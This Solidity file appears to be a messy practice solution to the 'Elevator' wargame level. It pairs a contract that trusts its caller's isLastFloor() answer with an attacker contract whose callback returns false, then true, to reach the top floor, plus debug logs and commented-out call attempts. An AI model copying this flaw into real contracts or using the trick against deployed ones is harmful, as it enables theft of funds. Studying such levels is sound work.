// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "hardhat/console.sol";
interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;
 //   Building public building = Building(msg.sender);
  function goTo(uint _floor) public {
    Building building = Building(msg.sender); //0x5B38Da6a701c568545dCfcB03FcB875f56beddC4

    if (! building.isLastFloor(_floor)) { // 0
      floor = _floor; /////.....
      console.log("-------",building.isLastFloor(floor));
      top = building.isLastFloor(floor);
    }
    else{
        revert("-----------");
    }
  } 

  function getSender() public view returns(address){
    console.log("---",msg.sender);
      return msg.sender;
  }
}

contract tt{
    Elevator public e;
    function t2() public{
       e = new Elevator();
     //  e.goTo(1);
    }

    function t3() public {
      //  e.goTo(0);

    //  e.delegatecall(abi.encodeWithSelector(e.goTo().selector,"uint");
//(//bool success, bytes memory data) = (address(e)).delegatecall(abi.encodeWithSignature("goTo(uint)",_floor));
 //address(e).call(bytes4(keccak256("goTo(uint256)"), 100));
 (bool success, bytes memory data) = address(e).call(abi.encodeWithSignature("getSender()"));
if(success){
    this;
}
else{
    revert();
}
    }

        function t4(uint _floor) public {
      //  e.goTo(0);

    //  e.delegatecall(abi.encodeWithSelector(e.goTo().selector,"uint");
//(//bool success, bytes memory data) = (address(e)).delegatecall(abi.encodeWithSignature("goTo(uint)",_floor));
 //address(e).call(bytes4(keccak256("goTo(uint256)"), 100));
 (bool success, bytes memory data) = address(0x5eCd8A553a6a64a8d703aA35746CDD053EAadE13).call(abi.encodeWithSignature("goTo(uint256)",_floor));
if(success){
    this;
}
else{
    revert();
}
    }

bool floor ;
uint counter = 0;
function isLastFloor(uint _floor) public  returns (bool){
  
   if((counter == 0) && (_floor == 0)){
     counter +=1;
     return false;
     
   }
   else if((counter == 1) && (_floor == 0) ){
     console.log("counter for 2",counter);
     return true;
   }
  else {
    revert();
  }
}

    


    
}


contract ass{
uint8 public a = 42;
  // assembly{
  //   a:= 1;
  // }
}


